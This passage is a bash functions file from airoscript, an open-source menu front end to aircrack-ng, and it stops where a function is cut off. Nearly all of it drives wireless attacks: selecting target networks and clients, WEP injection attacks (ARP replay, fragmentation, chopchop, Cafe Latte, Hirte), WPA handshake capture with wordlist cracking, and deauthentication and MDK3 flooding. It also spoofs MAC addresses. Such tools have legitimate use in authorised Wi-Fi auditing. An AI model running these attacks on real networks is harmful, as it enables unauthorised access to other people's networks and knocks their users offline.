#!/bin/bash
# Funcion file used by airoscript
# Copyright (C) 2009 David Francos Cuartero
#        This program is free software; you can redistribute it and/or
#        modify it under the terms of the GNU General Public License
#        as published by the Free Software Foundation; either version 2
#        of the License, or (at your option) any later version.

#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#        GNU General Public License for more details.

#        You should have received a copy of the GNU General Public License
#        along with this program; if not, write to the Free Software
#        Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

CHOICES="1 2 3 4 5 6 7 8 9 10 11 12"

function menu {
    mkmenu "Main Menu" "Scan     - Scan for target" "Select   - Select target" "Attack   - Attack target" "Crack    - Get target key" "Fakeauth - Auth with target" "Deauth   - Deauth from target" "Others   - Various utilities" "Inject   - Jump to inj. menu" "Auto     - Does 1,2,3" "Exit    - Quits"
}

## This is for SCAN (1) option: ###########################
function choosetype {
if [ "$AUTO" -eq 1 ]; then ENCRYPT=""; return; fi

while true; do $clear
  mkmenu "Select encryption" "No filter" "OPN (open)" "WEP" "WPA" "WPA1" "WPA2" "Return to main menu"
  echo "Option number: "
  read yn
  case $yn in
    1 ) ENCRYPT="" ; choosescan; break ;;
    2 ) ENCRYPT="OPN" ; choosescan; break ;;
    3 ) ENCRYPT="WEP" ; choosescan; break ;;
    4 ) ENCRYPT="WPA" ; choosescan; break ;;
    5 ) ENCRYPT="WPA1" ; choosescan; break ;;
    6 ) ENCRYPT="WPA2" ; choosescan; break ;;
    7 ) break;;
    * ) echo `gettext 'Unknown response. Try again'` ;;

  esac
done
}

function choosescan {
if [ "$AUTO" == 1 ]; then Scan; return; fi

while true; do
  arrow; mkmenu "Channel" "Channel Hoping" "Specific Channel"
  read yn
  case $yn in
    1 ) Scan;break;;
    2 ) Scanchan;break;;
    * ) echo -e "\n `gettext \"Unknown response. Try again\"`" ;;
  esac
done
}
	#Subproducts of choosescan.
	function Scan {
        export SCAN=1
		$clear; rm -rf $DUMP_PATH/dump*
        execute "Scanning for targets" $AIRODUMP -w $DUMP_PATH/dump --encrypt $ENCRYPT -a $WIFI
        export SCAN=0
	}

	function Scanchan {
      export SCAN=1
      arrow; echo -e "\n `gettext '
      +------------Channel Input----------+
      |       Please input channel        |
      |                                   |
      |          You can insert:          |
      |   A single number   6             |
      |   A range           1-5           |
      |   Multiple channels 1,1,2,5-7,11  |
      +-----------------------------------+
   '`"
		read channel_number; set -- ${channel_number}
	    $clear; rm -rf $DUMP_PATH/dump*; monmode $WIFI $channel_number
		execute "Scanning for targets on channel $channel_number" $AIRODUMP -w $DUMP_PATH/dump --channel $channel_number --encrypt $ENCRYPT -a $WIFI
        export SCAN=0
	}

# This is for SELECT (2) option
function Parseforap {
	i=0; ap_array=`cat $DUMP_PATH/dump-01.csv | grep -a -n Station | awk -F : '{print $1}'`
	head -n $ap_array $DUMP_PATH/dump-01.csv &> $DUMP_PATH/dump-02.csv ; $clear

	echo -e "`gettext \"\\tDetected Access point list\"`\n"
	echo -e "`gettext \"#\\t\\tMAC\\t\\tCHAN\\tSECU\\tPOWER\\t#CHAR\\t\\tSSID\"`\n"

	while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY;do
	 longueur=${#MAC}
	   if [ $longueur -ge 17 ]; then
	    i=$(($i+1))
	    echo -e " "$i")\t"$MAC"\t"$CHANNEL"\t"$PRIVACY"\t"$POWER"\t"$IDLENGTH"\t"$ESSID
	    aidlenght=$IDLENGTH
	    assid[$i]=$ESSID
	    achannel[$i]=$CHANNEL
	    amac[$i]=$MAC
	    aprivacy[$i]=$PRIVACY
	    aspeed[$i]=$SPEED
	   fi
	done < $DUMP_PATH/dump-02.csv

	echo -e -n "`gettext 'Select target: '`"
	read choice

	idlenght=${aidlenght[$choice]}
	ssid=${assid[$choice]}
	channel=${achannel[$choice]}
	mac=${amac[$choice]}
	privacy=${aprivacy[$choice]}
	speed=${aspeed[$choice]}
	Host_IDL=$idlength
	Host_SPEED=$speed
	Host_ENC=$privacy
	Host_MAC=$mac
	Host_CHAN=$channel
	acouper=${#ssid}
	fin=$(($acouper-idlength))
	Host_SSID=${ssid:1:fin}
}

function choosetarget {
if [ "$AUTO" == 1 ]; then return; fi
while true; do
  mkmenu "Client Selection" "Select associated clients" "No select clients" "Try to detect clients" "Show me the clients" "Correct the SSID"
  read yn
  case $yn in
    1 ) listsel2  ; break ;;
    2 ) break ;;
    3 ) clientdetect && clientfound ; break ;;
    4 ) askclientsel ; break ;;
    5 ) Host_ssidinput && choosetarget ; break ;; #Host_ssidinput is called from many places, not putting it here.
    * ) echo -e "`gettext \"Unknown response. Try again\"`"; sleep 1; $clear ;;
  esac
done
}
 # Those are subproducts of choosetarget.
	# List clients, (Option 1)
	function listsel2 {
        if [ "$AUTO" == "1" ]; then return; fi
	    HOST=`cat $DUMP_PATH/dump-01.csv | grep -a $Host_MAC | awk '{ print $1 }'| grep -a -v 00:00:00:00| grep -a -v $Host_MAC`
        arrow; mkbox "Client Selection" "Select client now" "These clients are connected to" $Host_SSID
        select CLIENT in $HOST;	do export Client_MAC=` echo $CLIENT | awk '{ split($1, info, "," ) print info[1]  }' `;break;done
	}

	# This way we detect clients. (Option 3)
	function clientdetect {
        if [ "$AUTO" == "1" ]; then return; fi
		$iwconfig $WIFICARD channel $Host_CHAN
		capture & deauthall & menufonction # Those functions are used from many others, so I dont let them here, they'll be independent.
	}

	function clientfound {
        if [ "$AUTO" == "1" ]; then return; fi
		while true; do
          arrow; mkmenu "Client Selection" "I found some client" "No clients showed up"
		  read yn
		  case $yn in
	        1 ) listsel3 ; break ;;
		    2 ) break ;;
		    * ) echo -e "`gettext \"Unknown response. Try again\"`" ;;
		  esac
		done
		}
		function listsel3 {
            if [ "$AUTO" == "1" ]; then return; fi
			HOST=`cat $DUMP_PATH/$Host_MAC-01.csv | grep -a $Host_MAC | awk '{ print $1 }'| grep -a -v 00:00:00:00| grep -a -v $Host_MAC|sed 's/,//'`
                arrow; mkbox "Client Selection" "Select client now" "These clients are connected to" $Host_SSID
				select CLIENT in $HOST; do
					export Client_MAC=` echo $CLIENT | awk '{
						split($1, info, "," )
						print info[1]  }' `	
					break;
				done
		}

	# Show clientes (Option 4)
	function askclientsel {
        if [ "$AUTO" == "1" ]; then return; fi
		while true; do
		  $clear; mkmenu "Client Selection" "Detected clients" "Manual Input" "Associated Client List"
		  read yn
		  echo ""
		  case $yn in
		    1 ) asklistsel ; break ;;
		    2 ) clientinput ; break ;;
		    3 ) listsel2 ; break ;;
		    * ) echo -e "`gettext 'Unknown response. Try again'`" ;;
		  esac
	done
	}

		function asklistsel {
            if [ "$AUTO" == "1" ]; then return; fi
			while true; do
				$clear; arrow; mkmenu "Client Selection" "Clients of $Host_SSID" "Full list (all macs)"
				if [ "$Host_SSID" = $'\r' ]; then Host_SSID="`gettext \"No SSID has been detected!\"`"; fi
				read yn
				case $yn in
					1 ) listsel2 ; break ;;
					2 ) listsel1 ; break ;;
					* ) echo -e "`gettext \"Unknown response. Try again\"`" ;;
				esac
			done
		}

			function listsel1 {
                if [ "$AUTO" == "1" ]; then return; fi
				HOST=`cat $DUMP_PATH/dump-01.csv | grep -a "0.:..:..:..:.." | awk '{ print $1 }'| grep -a -v 00:00:00:00`
				arrow; mkbox "Client selection" "Select client now"
				select CLIENT in $HOST;
				do
					export Client_MAC=` echo $CLIENT | awk '{
						split($1, info, "," )
						print info[1]  }' `	
					break;
				done
			}

		function clientinput {
            if [ "$AUTO" == "1" ]; then return; fi
			arrow; mkbox "Client selection" "Type in client mac now"
			read Client_MAC; set -- ${Client_MAC}
		}

# This is for ATTACK (3) option
function witchattack { monmode
    if [[ "$Host_ENC" =~ (.*)"WEP"(.*) ]]; then attackwep
    elif [[ "$Host_ENC" =~ (.*)"WPA"(.*) ]]; then attackwpa
    else attackopn; fi
}

	# If wep
	function attackwep {
	while true; do $clear   
	  echo -e -n "`gettext '
	  +----------WEP ATTACKS---------------+
	  |   Attacks not using a client       |
	  |                                    |
	  |   1)  Fake auth => Automatic       |
	  |   2)  Fake auth => Interactive     |
	  |   3)  Fragmentation attack         |
	  |   4)  Chopchop attack              |
	  |   5)  Cafe Latte attack            |
	  |   6)  Hirte attack                 |
	  | __________________________________ |
	  |                                    |
	  |   Attacks using a client           |
	  |                                    |
	  |   7)  ARP replay => Automatic      |
	  |   8)  ARP replay => Interactive    |
	  |   9)  Fragmentation attack         |
	  |  10)  Frag. attack on client       |
	  |  11)  Chopchop attack              |
	  | __________________________________ |
	  |                                    |
	  |  Injection if xor file generated   |
	  |                                    |
	  |  12) ARP inject from xor (PSK)     |
	  |  13) Return to main menu           |
	  +------------------------------------+
	  Option: '`"
	  read yn
	  echo ""
	  case $yn in
	    1 ) fakeautoattack ; break ;;
	    2 ) fakeinteractiveattack;$clear ; break ;;
	    3 ) fragnoclient ;$clear; break ;;
	    4 ) chopchopattack ;$clear; break ;;
	    5 ) cafelatteattack ;$clear; break ;;
	    6 ) hirteattack ;$clear; break ;;
	    7 ) attackclient ;$clear; break ;;
	    8 ) interactiveattack ;$clear; break ;;
	    9 ) fragmentationattack -5 ;$clear; break ;;
	    10 ) fragmentationattack -7 ;$clear ; break ;;  
	    11 ) chopchopattackclient;$clear ; break ;;
	    12 ) pskarp ;$clear; break ;;
	    13 ) $clear;break ;;
	    * ) echo -e "`gettext \"Unknown response. Try again\"`" ;;
	  esac
	done
	}
		# Subproducts of attackwep function:

		#Option 1 (fake auth auto)
		function fakeautoattack {
			if [ "$INTERACTIVE" == 1 ]; then
				
				read -p "`gettext \"Enter destination mac: (FF:FF:FF:FF:FF:FF)\"`" INJMAC
					if [ "$INJMAC" = "" ]; then INJMAC="FF:FF:FF:FF:FF:FF"; fi
				read -p "`gettext \"Enable From or To destination bit (f/t):  \"`" FT
					if [ "$FT" = "" ]; then FT="f"; fi
			else
				INJMAC="FF:FF:FF:FF:FF:FF"
				FT="f"
			fi

			capture & execute "Injection: Host: $Host_MAC" $AIREPLAY $IWIFI --arpreplay -b $Host_MAC -d $INJMAC -$FT 1 -m 68 -n 86 -h $FAKE_MAC -x $INJECTRATE & choosefake

		}
		#Option 2 (fake auth interactive)
		function fakeinteractiveattack {
			if [ "$INTERACTIVE" == "1" ]; then
				read -p "`gettext \"Enter destination mac: (FF:FF:FF:FF:FF:FF)\"`" INJMAC
					if [ "$INJMAC" = "" ]; then INJMAC="FF:FF:FF:FF:FF:FF"; fi
				read -p "`gettext \"Set framecontrol word (hex): (0841) \"`" FT
					if [ "$FT" = "" ]; then FT="0841"; fi
			else
				INJMAC="FF:FF:FF:FF:FF:FF"
				FT="0841"
			fi
			capture & execute  "Interactive Packet Sel on Host: $Host_SSID" $AIREPLAY $IWIFI --interactive -p $FT -c $INJMAC -b $Host_MAC -h $FAKE_MAC -x $INJECTRATE & choosefake
		}

		#Option 3 (fragmentation attack)
		function fragnoclient {
			rm -rf fragment-*.xor $DUMP_PATH/frag_*.cap $DUMP_PATH/$Host_MAC*
			killall -9 airodump-ng aireplay-ng 
            execute "Fragmentation w/o client" $AIREPLAY -5 -b $Host_MAC -h $FAKE_MAC -k $FRAG_CLIENT_IP -l $FRAG_HOST_IP $IWIFI & capture & choosefake &  injectmenu
			}

		#Option 4 (chopchopattack)
		function chopchopattack {
			$clear && hardclean  replay_dec-*.xor
			capture &  fakeauth3 & 
            execute "Chopchoping: $Host_MAC" $AIREPLAY --chopchop -b $Host_MAC -h $FAKE_MAC $IWIFI & injectmenu
		}
		#Option 5 (caffe late attack)
		function cafelatteattack {
			capture & execute  "Cafe Latte Attack on: $Host_SSID " $AIREPLAY -6 -b $Host_MAC -h $FAKE_MAC -x $INJECTRATE -D $IWIFI & fakeauth3 & menufonction
			}

		#Option 6 (hirte attack)
		function hirteattack {
			capture & execute "Hirte Attack on: $Host_SSID" $AIREPLAY -7 -b $Host_MAC -h $FAKE_MAC -x $INJECTRATE -D $IWIFI & fakeauth3 & menufonction
		}

		#Option 7 (Auto arp replay)
		function attackclient {
			if [ "$INTERACTIVE" == "1" ]; then
				read -p "`gettext \"Enter destination mac: (FF:FF:FF:FF:FF:FF)\"`" INJMAC
					if [ "$INJMAC" = "" ]; then INJMAC="FF:FF:FF:FF:FF:FF"; fi
				read -p "`gettext 'Enable From or To destination bit (f/t):  '`" FT
					if [ "$FT" = "" ]; then FT="f"; fi
			else INJMAC="FF:FF:FF:FF:FF:FF"; FT="f"; fi
			capture & execute "Injection in Host: $Host_MAC Client $Client_MAC" $AIREPLAY $IWIFI --arpreplay -b $Host_MAC -d $INJMAC -$FT 1 -m 68 -n 86  -h $Client_MAC -x $INJECTRATE & menufonction
		}

		#Option 8 (interactive arp replay)
		function interactiveattack {
			if [ "$INTERACTIVE" == 1 ]; then
				read -p "`gettext 'Enter destination mac: (FF:FF:FF:FF:FF:FF)'`" INJMAC
					if [ "$INJMAC" = "" ]; then INJMAC="FF:FF:FF:FF:FF:FF"; fi
				read -p "`gettext 'Set framecontrol word (hex): (0841) '`" FT
					if [ "$FT" = "" ]; then FT="0841"; fi
			else INJMAC="FF:FF:FF:FF:FF:FF"; FT="0841"; fi
			capture & execute "Interactive Packet Sel on: $Host_SSID" $AIREPLAY $IWIFI --interactive -p $FT -c $INJMAC -b $Host_MAC $Client_MAC -x $INJECTRATE & menufonction
		}

		#Option 9 (fragmentation attack)
		function fragmentationattack {
			rm -rf fragment-*.xor $DUMP_PATH/frag_*.cap $DUMP_PATH/$Host_MAC*
			killall -9 airodump-ng aireplay-ng
            execute "Fragmentation attack" $AIREPLAY $1 -b $Host_MAC -h $Client_MAC -k $FRAG_CLIENT_IP -l $FRAG_HOST_IP $IWIFI & capture &  injectmenu
		}
		#Option 11
		function chopchopattackclient {
			$clear && hardclean  replay_dec-*.xor
			capture & execute "ChopChoping: $Host_SSID" $AIREPLAY --chopchop -h $Client_MAC $IWIFI & injectmenu
		}
		#Option 12 (pskarp)
		function pskarp {
			rm -rf $DUMP_PATH/arp_*.cap
			$ARPFORGE -0 -a $Host_MAC -h $Client_MAC -k $Client_IP -l $Host_IP -y $DUMP_PATH/dump*.xor -w $DUMP_PATH/arp_$Host_MAC.cap 	
            execute "PSK ARP Replaying" $AIREPLAY --interactive -r $DUMP_PATH/arp_$Host_MAC.cap -h $Client_MAC -x $INJECTRATE $IWIFI & menufonction
		}
		# End of subproducts.

	# If wpa
	function wpahandshake {
		$clear && hardclean 
		execute "Capturing data on channel: $Host_CHAN"  $AIRODUMP -w $DUMP_PATH/$Host_MAC --channel $Host_CHAN -a $WIFI & menufonction
	}

	function attackopn { # If no encryption detected
	  if [ "$Host_SSID" = "" ]; then
		 $clear &&  echo  "`gettext 'ERROR: You have to select a target'`"
	  else
		$clear && echo `gettext "ERROR: Network not encrypted or no network selected "`
	  fi
	}


	function attackwpa {
while true; do
$clear; mkmenu "Select WPA Attack" "Standard attack" "Standard attack with QoS (WMM)"
read n
	case $n in
		1) wpahandshake; $clear; break;;
		2) tkiptunstdqos; $clear; break;;
	esac
done
	}

	# 1 just capture
	function wpahandshake {
		$clear && hardclean
		execute "Capturing data on channel: $Host_CHAN"  $AIRODUMP -w $DUMP_PATH/$Host_MAC --channel $Host_CHAN -a $WIFI & menufonction
	}

	# 2 Use tkiptun-ng
	function tkiptunstdqos {
		$clear && hardclean 
		ifconfig $WIFICARD channel $Host_CHAN # Hope this is ok for all cards
		execute "Executing tkiptun-ng for ap $Host_MAC"  $TKIPTUN -h $FAKE_MAC -a $Host_MAC -m $TKIPTUN_MIN_PL -n $TKIPTUN_MAX_PL  $WIFI & menufonction
	}

   
# This is for CRACK (4)  option
function witchcrack {
	if [ "$EXTERNAL" = "1" ]
		then
			while true; do
                arrow; mkmenu "WEP/WPA Cracking Options" "Autocrack" "Wlandecrypter" "Jazzteldecripter" "Standard aircrack-ng" "Return to menu" &&  read yn
				case $yn in
					1 ) auto ; break ;;
					2 ) wld ; break ;;
					3 ) jtd ; break ;;
					4 ) selectcracking ; break ;;
					5 ) $clear; break;;
					* ) echo "Unknown response. Try again" ;;
				esac
			done
		else echo "No external functions loaded, defaulting to wep/wpa cracking"; selectcracking
		fi
}

function selectcracking {
	if [ "$Host_ENC" = "OPN" ] || [ "$Host_ENC" = "" ] || [ "$Host_ENC" = " OPN " ]; then
		$clear && echo `gettext "ERROR: Network not encrypted or no network selected "`
	else
		if [ "$Host_ENC" = " WEP " ] || [ "$Host_ENC" = "WEP" ]; then crack
		else wpacrack; fi
	fi
}

#This is crack function, for WEP encryption:
	function crack {
		while true; do
        mkmenu "WEP Cracking Options" "aircrack-ng PTW attack" "aircrack-ng standard" "aircrack-ng user options"
		read yn
		case $yn in
	    	2 ) execute $AIRCRACK -a 1 -b $Host_MAC -f $FUDGEFACTOR -0 -s $DUMP_PATH/$Host_MAC-01.cap & menufonction; $clear; break ;;
	    	3 ) read -p "Insert Fudge Factor: " FUDGE_FACTOR;
                read -p "`gettext 'Type encryption size (64,128...): '`" ENC_SIZE
			    execute "Manual cracking" $AIRCRACK -a 1 -b $Host_MAC -f $FUDGE_FACTOR\
                -n $ENC_SIZE -0 -s $DUMP_PATH/$Host_MAC-*.cap & 
                menufonction ; $clear; 
                break ;;
	    	* ) echo "`gettext 'Unknown response. Try again'`" ;;
		esac
		done
	}

	# This is for wpa cracking
	function wpacrack {
        execute $AIRCRACK $FORCEWPAKOREK -a 2 -b $Host_MAC -0 -s $DUMP_PATH/$Host_MAC-01.cap -w $WORDLIST & menufonction
	}
	
# This is for Fake auth  (5)  option
function choosefake {
if [ "$Host_SSID" = "" ]; then $clear; echo "ERROR: You have to select a target first"
else
    if [ "$INTERACTIVE" == "1" ]; then
    	while true; do
            mkmenu "Fake Auth Method" "Conservative" "Standard" "Progressive"
    		read yn; case $yn in
		    	1 ) fakeauth1 ;$clear; break ;;
		    	2 ) fakeauth2 ;$clear; break ;;
		    	3 ) fakeauth3 ;$clear; break ;;
		    	* ) echo "Unknown response. Try again" ;;
	        esac
    	done
    else fakeauth1||fakeauth2||fakeauth3; $clear; fi
fi
}


# Those are subproducts of choosefake
	function fakeauth1 {
        execute "Fake auth (1)" $AIREPLAY --fakeauth 6000 -o 1 -q 10 -e "$Host_SSID" -a $Host_MAC -h $FAKE_MAC $IWIFI & menufonction
	}
	function fakeauth2 {
        execute "Fake auth (2)" $AIREPLAY --fakeauth 0 -e "$Host_SSID" -a $Host_MAC -h $FAKE_MAC $IWIFI & menufonction
	}
	function fakeauth3 {
        execute "Fake auth (3)" $AIREPLAY --fakeauth 5 -o 10 -q 1 -e "$Host_SSID" -a $Host_MAC -h $FAKE_MAC $IWIFI & menufonction
	}
	

# This is for deauth  (6)  option
function choosedeauth {
if [ "$Host_SSID" = "" ]; then $clear
	echo "ERROR: You have to select a target first"
else
	while true; do
        arrow; mkmenu "Who do you want to deauth?" "Everybody" "Myself (fake mac)" "Selected client"
    	read yn; $clear
	    case $yn in
            1 ) deauthall ; break ;;
            2 ) deauthfake ; break ;;
            3 ) deauthclient ; break ;;
            * ) echo -e "`gettext \"Unknown response. Try again\"`" ;;
	    esac
	done
fi
}

	# Subproducts of choosedeauth
		function deauthall {
            execute "Deauth All" $AIREPLAY --deauth $DEAUTHTIME -a $Host_MAC $WIFI
		}
		
		function deauthclient {
		if [ "$Client_MAC" = "" ]; then 
            $clear; echo "ERROR: You have to select a client first"
		else 
            execute "Deauth client" $AIREPLAY --deauth $DEAUTHTIME -a $Host_MAC \
            -c $Client_MAC $IWIFI
		fi
		}
		
		function deauthfake {
            execute "Deautenticating" $AIREPLAY --deauth $DEAUTHTIME -a $Host_MAC -c $FAKE_MAC $IWIFI
		}


# This is for others  (7)  option

function optionmenu { # FIXME make an option to store the resulting pw in a variable.
	while true; do
    mkmenu "Test injection" "Select another interface" "Reset selected interface" "Change MAC of interface" "Mdk3" "Wesside-ng" "Enable monitor mode" "Checks with airmon-ng" "Change DUMP_PATH" "Merge all ivs from all sessions" "Decrypt current packages" "Return to main menu"
    	read yn; case $yn in
        	1 ) inject_test ; $clear; break ;;
        	2 ) setinterface2 ; $ClEAR; break ;;
        	3 ) cleanup ;$clear; break ;;
        	4 ) wichchangemac ; $clear; break ;;
        	5 ) choosemdk ;$clear; break;;
        	6 ) choosewesside ;$clear; break ;;
         	7 ) monmode;$clear ; break ;;
        	8 ) airmoncheck ;$clear; break ;;
        	9 ) changedumppath;$clear; break;;
            10) mergeallivs;$clear; break;;
        	11 ) $clear;break ;;
        	* ) echo -e "`gettext \"Unknown response. Try again\"`" ;;
	    esac
	done
}

# I suppose all these are part of this option:
	# 1.
	function inject_test {
        execute "Test injection" $AIREPLAY $IWIFI --test & menufonction
	}
	# 2.
	function setinterface2 {

		echo "`gettext 'Select your interface:'`"
		select WIFI in $INTERFACES; do break; done

		export WIFICARD=$WIFI
		echo -n `gettext 'Should I put it in monitor mode?'` " (Y/n) "
		read answer
			if [ "$answer" != "n" ]
			then
				TYPE=`$AIRMON start $WIFICARD | grep monitor | awk '{print $2 $3}'`
				DRIVER=`$AIRMON start $WIFICARD | grep monitor | awk '{print $4}'`
			else
				TYPE=`$AIRMON stop $WIFICARD | grep monitor | awk '{print $2 $3}'`
				DRIVER=`$AIRMON stop $WIFICARD | grep monitor | awk '{print $4}'`
			fi
		$clear; $IWIFI=$WIFI
		echo  `gettext 'Interface used is :'` $WIFICARD
		echo  `gettext 'Interface type is :'` "$TYPE ($DRIVER)"
		testmac
	}

	# 3.
	function cleanup {
		killall -9 aireplay-ng airodump-ng &> /dev/null &
		$AIRMON stop $WIFICARD; ifconfig $WIFICARD down
		$clear; sleep 2; $CARDCTL eject; sleep 2; $CARDCTL insert
		ifconfig $WIFICARD up; $AIRMON start $WIFICARD $Host_CHAN
		$iwconfig $WIFICARD
	}

	# 4.
	function wichchangemac {
		while true; do
            arrow; mkmenu "Mac" "Change MAC to FAKEMAC" "Change MAC to CLIENTMAC" "Manual Mac Input"
			read yn
			case $yn in
				1 )	ifconfig $WIFICARD down
				    $MACCHANGER -m  $FAKE_MAC $WIFICARD
				    ifconfig $WIFICARD up; $clear; break ;;
				2 ) ifconfig $WIFICARD down; sleep 2
				    $MACCHANGER -m  $Client_MAC $WIFICARD
				    ifconfig $WIFICARD up ;$clear; break ;;
				3 ) read -p "MAC: " Manual_MAC
					ifconfig $WIFICARD down
					$MACCHANGER -m  $Manual_MAC $WIFICARD
					ifconfig $WIFICARD up; $clear; break ;;
				* ) echo -e "`gettext \"Unknown response. Try again\"`" ;;
			esac
		done
	}

	# 5.
		function choosemdk {
			if [ -x "$MDK3" ]; then
			while true; do
				$clear; mkmenu "Choose MDK3 Options" "Deauthentication" "Prob selected AP" "Select another target" "Autentication DoS" "Return to main menu"
				read yn
				case $yn in
					1 ) mdkpain ; break ;;
					2 ) mdktargetedpain ; break ;;
					3 ) mdknewtarget ; break ;;
					4 ) mdkauth ; break ;;
					5 ) break ;;
					* ) echo "unknown response. Try again" ;;
				esac
			done
			else $clear && echo "Sorry, this function is not installed on your system"
			fi
		}

			function mdkpain {
                execute "MDK3 Pain" $MDK3 $WIFI d & choosemdk
			}

			function mdktargetedpain {
                execute "MDK3 Targeted pain" $MDK3 $WIFI p -b a -c $Host_CHAN -t $Host_MAC & choosemdk
			}

			function mdknewtarget {
				ap_array=`cat $DUMP_PATH/dump-01.csv | grep -a -n Station | awk -F : '{print $1}'`
				head -n $ap_array $DUMP_PATH/dump-01.csv &> $DUMP_PATH/dump-02.csv ; $clear
                echo " +--------------------------------------------------------------------+"
				echo " |       Detected Access point list                                   |"
				echo " |      MAC                      CHAN    SECU    POWER   #CHAR   SSID |"
                echo " |                                                                    |"
				i=0
				while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY;do
					longueur=${#MAC}
                    if [ $longueur -ge 17 ]; then i=$(($i+1))
					    echo -e " "$i")\t"$MAC"\t"$CHANNEL"\t"$PRIVACY"\t"$POWER"\t"$IDLENGTH"\t"$ESSID
					    aidlenght=$IDLENGTH; assid[$i]=$ESSID; achannel[$i]=$CHANNEL;
					    amac[$i]=$MAC; aprivacy[$i]=$PRIVACY; aspeed[$i]=$SPEED
					fi
				done < $DUMP_PATH/dump-02.csv
				echo -n "\n        Select target               "
				read choice
					idlenght=${aidlenght[$choice]};	ssid=${assid[$choice]};
					channel=${achannel[$choice]}; mac=${amac[$choice]};
					privacy=${aprivacy[$choice]};speed=${aspeed[$choice]};
					Host_IDL=$idlength;Host_SPEED=$speed;
					Host_ENC=$privacy;Host_MAC=$mac;
					Host_CHAN=$channel;acouper=${#ssid};
					fin=$(($acouper-idlength));Host_SSID=${ssid:1:fin};
					choosemdk
			}

			function mdkauth {
                execute "MDK3 AUTH" $MDK3 $WIFI a & choosemdk
			}

	# 6.
		function choosewesside {
			while true; do
				$clear; mkmenu "Choose Wesside-ng Options" "No args" "Selected target" "Sel. target max retrans" "Sel. target poor conection" "Select another target" "Return to main menu"
				read yn; case $yn in
					1 ) wesside ; break ;;
					2 ) wessidetarget ; break ;;
					3 ) wessidetargetmaxer ; break ;;
					4 ) wessidetargetpoor ; break ;;
					5 ) wessidenewtarget ; break ;;
					6 ) break ;;
					* ) echo -e "`gettext \"Unknown response. Try again\"`" ;;
				esac
			done
		}

			function wesside {
				rm -rf prga.log wep.cap key.log
                execute "Wesside-ng" $WESSIDE -i $WIFI & choosewesside
			}

			function wessidetarget {
				rm -rf prga.log wep.cap key.log
                execute "Wesside-ng" $WESSIDE -v $Host_MAC -i $WIFI & choosewesside
			}

			function wessidetargetmaxer {
				rm -rf prga.log wep.cap key.log
                execute "Wesside-ng" $WESSIDE -v $Host_MAC -k 1 -i $WIFI & choosewesside
			}

			function wessidetargetpoor {
				rm -rf prga.log wep.cap key.log
                execute "Wesside-ng" $WESSIDE -v $Host_MAC -k 3 -i $WIFI & choosewesside
			}

			function wessidenewtarget {
				rm -rf prga.log wep.cap  key.log
				ap_array=`cat $DUMP_PATH/dump-01.csv | grep -a -n Station | awk -F : '{print $1}'`
				head -n $ap_array $DUMP_PATH/dump-01.csv &> $DUMP_PATH/dump-02.csv && $clear && i=0
				echo -e "`gettext\"        Detected Access point list\"`"
				echo -e "\n #      MAC                      CHAN    SECU    POWER   #CHAR   SSID\n"
				while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY;do
				longueur=${#MAC}
				if [ $longueur -ge 17 ]; then
					i=$(($i+1))
					echo -e " "$i")\t"$MAC"\t"$CHANNEL"\t"$PRIVACY"\t"$POWER"\t"$IDLENGTH"\t"$ESSID
					aidlenght=$IDLENGTH
					assid[$i]=$ESSID
					achannel[$i]=$CHANNEL
					amac[$i]=$MAC
					aprivacy[$i]=$PRIVACY
					aspeed[$i]=$SPEED
				fi

				done < $DUMP_PATH/dump-02.csv
					echo -e "`gettext \"       Select target               \"`"
					read choice
						idlenght=${aidlenght[$choice]}
						ssid=${assid[$choice]}
						channel=${achannel[$choice]}
						mac=${amac[$choice]}
						privacy=${aprivacy[$choice]}
						speed=${aspeed[$choice]}
						Host_IDL=$idlength
						Host_SPEED=$speed
						Host_ENC=$privacy
						Host_MAC=$mac
						Host_CHAN=$channel
						acouper=${#ssid}
						fin=$(($acouper-idlength))
						Host_SSID=${ssid:1:fin}
                        execute "Wesside" $WESSIDE -v $Host_MAC -i $WIFI & choosewesside
			}



	# 8.
	function airmoncheck {
		if [ "$TYPE" = "Atherosmadwifi-ng" ]; then $AIRMON check wifi0
		else $AIRMON check $WIFICARD; fi
	}

mergethisivs(){ # TODO Untested
    for i in $DUMP_PATH/$Host_MAC*.cap; do 
        cur=$( $cur + `$IVSTOOLS --convert $i /dev/null|grep IVs|awk '{print $2}'`)
    done
    return $cur
}

mergeallivs(){ # TODO Untested
    newdir=`mktemp -d`
    for i in $TMPDIR/*/*.cap; do b=$(( $b + 1 )); $IVSTOOLS --convert $i $newdir/$b; done
    ivstools --merge $newdir/* $DUMP_PATH/merged.cap
	read -p "`gettext 'Select merged data as target? (y/N): '`" ACP && [[ "$ACP" = "y" ]] && Host_MAC="merged"
}
changedumppath(){
	OLD_DUMP_PATH=$DUMP_PATH
	read -p "`gettext 'Enter new path: '`" DUMP_PATH
	read -p "`gettext 'Copy data into new folder? (y/N): '`" ACP && [[ "$ACP" = "y" ]] && cp -r $OLD_DUMP_PATH/* $DUMP_PATH/
	read -p "`gettext 'Erase old folder? (y/N): '`" EPF && [[ "$EPF" = "y" ]] && rm -r $OLD_DUMP_PATH
	mkdir -p $DUMP_PATH # If exists, it won't be created again, so we don't lose anything fot this :-)
	clear
}

# This is for iNJECTION  (8)  option
function injectmenu {
	$clear
	while true; do
        mkmenu "Frag Injection" "Frag with client injection" "Chopchop injection" "Chopchop with client inj." "Return to main menu"
		read yn; case $yn in
			1 ) fragend $Client_MAC ; break ;;
			2 ) fragend $FAKE_MAC; break ;;
			3 ) chopchopend $FAKE_MAC ; break ;;
			4 ) chopchopend $CLIENT_MAC ; break ;;
			* ) $clear; break;;
		esac
	done
}

	function fragend {
		if [ "$Host_MAC" = "" ]; then
			$clear && echo `gettext 'ERROR: You must select a target first'`
		else
		    $ARPFORGE -0 -a $Host_MAC -h $FAKE_MAC -k $Client_IP -l $Host_IP -y fragment-*.xor -w $DUMP_PATH/frag_$Host_MAC.cap
            execute "Fragmentation without client" $AIREPLAY -2 -r $DUMP_PATH/frag_$Host_MAC.cap -h $1 -x $INJECTRATE $IWIFI & menufonction
		fi
	}

	function chopchopend {
